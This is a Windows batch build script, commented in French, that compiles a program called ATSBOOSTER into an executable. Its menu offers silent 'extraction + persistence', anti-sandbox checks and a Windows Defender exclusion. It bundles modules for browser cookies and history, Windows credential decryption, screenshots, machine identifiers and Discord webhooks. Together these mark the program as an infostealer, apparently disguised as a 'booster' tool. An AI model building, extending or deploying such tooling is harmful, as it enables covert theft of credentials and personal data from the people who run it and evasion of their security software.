@echo off
echo ========================================
echo   ATSBOOSTER - Build EXE
echo ========================================
echo.

echo Choisissez le mode d'execution de l'EXE :
echo.
echo   [1] Mode interactif (TUI avec menu)
echo   [2] Mode silencieux (extraction + persistence, sans interface)
echo   [3] Mode boost (extraction seule, sans persistence)
echo   [4] Mode daily check (check quotidien anti-sandbox + nouvelles donnees)
echo   [5] Mode all (interactif + persistence + daily check + defender exclusion)
echo.
set /p choice="Votre choix (1-5) [1]: "
if "%choice%"=="" set choice=1

if "%choice%"=="1" set MODE_ARG=interactive
if "%choice%"=="2" set MODE_ARG=--silent
if "%choice%"=="3" set MODE_ARG=--boost
if "%choice%"=="4" set MODE_ARG=--daily
if "%choice%"=="5" set MODE_ARG=--all

if not defined MODE_ARG (
    echo Choix invalide, utilisation du mode interactif par defaut.
    set MODE_ARG=interactive
)

echo.
echo Mode selectionne : %MODE_ARG%
echo.

echo [1/4] Installation des dependances...
pip install -r requirements.txt pyinstaller --quiet

echo.
echo [2/4] Nettoyage des anciens builds...
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist ATSBOOSTER.spec del ATSBOOSTER.spec
if exist _entry_atsbooster.py del _entry_atsbooster.py

echo.
echo [3/4] Creation du point d'entree...
if "%MODE_ARG%"=="interactive" (
    echo import ATSBOOSTER> _entry_atsbooster.py
    echo ATSBOOSTER.run_tui^(^)>> _entry_atsbooster.py
) else (
    echo import sys> _entry_atsbooster.py
    echo sys.argv = ['ATSBOOSTER.py', '%MODE_ARG%']>> _entry_atsbooster.py
    echo import ATSBOOSTER>> _entry_atsbooster.py
    echo ATSBOOSTER.main_entry^(^)>> _entry_atsbooster.py
)

echo.
echo [4/4] Compilation de l' EXE...
pyinstaller --onefile --name ATSBOOSTER --console --clean --noconfirm ^
    --hidden-import browser_cookie3 ^
    --hidden-import browser_history ^
    --hidden-import discord_webhook ^
    --hidden-import Crypto.Cipher.AES ^
    --hidden-import Crypto.Random ^
    --hidden-import win32crypt ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import winreg ^
    --hidden-import pyautogui ^
    --hidden-import cpuinfo ^
    --hidden-import psutil ^
    --hidden-import getmac ^
    --hidden-import prettytable ^
    --hidden-import PIL ^
    --hidden-import PIL.ImageGrab ^
    --collect-all browser_cookie3 ^
    --collect-all browser_history ^
    --collect-all discord_webhook ^
    --collect-all PIL ^
    _entry_atsbooster.py

if exist _entry_atsbooster.py del _entry_atsbooster.py

echo.
if exist dist\ATSBOOSTER.exe (
    echo ========================================
    echo   BUILD REUSSI !
    echo   Mode : %MODE_ARG%
    echo   EXE : dist\ATSBOOSTER.exe
    echo ========================================
    echo.
    echo Copie de l' EXE vers le dossier racine...
    copy /Y dist\ATSBOOSTER.exe ATSBOOSTER.exe >nul
    echo.
    echo L' EXE est pret : ATSBOOSTER.exe
) else (
    echo ========================================
    echo   ECHEC DU BUILD
    echo   Verifiez les erreurs ci-dessus
    echo ========================================
)
echo.
pause
